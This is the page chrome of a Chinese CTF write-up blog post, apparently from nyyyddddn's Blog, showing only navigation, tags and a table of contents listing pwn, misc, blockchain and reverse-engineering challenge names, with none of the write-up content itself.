    <a href="/2024/02/27/hgame2024week3-wp/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/02/14/nssr18-wp/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-02-25 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/ctf/">ctf<span>56</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/ctf-writeup/">ctf writeup<span>56</span></a></li> <li><a href="/tags/fmt/">fmt<span>6</span></a></li> <li><a href="/tags/shellcode/">shellcode<span>5</span></a></li> <li><a href="/tags/cpp-pwn/">cpp pwn<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#pwn"><span class="toc-article-text">pwn</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AD%BE%E5%88%B0-stack"><span class="toc-article-text">[签到]stack</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Easy-SI"><span class="toc-article-text">Easy_SI</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Bug-Zapper"><span class="toc-article-text">Bug_Zapper</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Eeeeasy-Cpp"><span class="toc-article-text">Eeeeasy_Cpp</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#overflow"><span class="toc-article-text">overflow</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#misc"><span class="toc-article-text">misc</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#GeekChallege"><span class="toc-article-text">GeekChallege</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#WHO-WHO-WHO"><span class="toc-article-text">WHO?WHO?WHO</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#blockchain"><span class="toc-article-text">blockchain</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CheckinNewYear"><span class="toc-article-text">CheckinNewYear</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#re"><span class="toc-article-text">re</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#battle-city"><span class="toc-article-text">battle-city</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2025 nyyyddddn's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
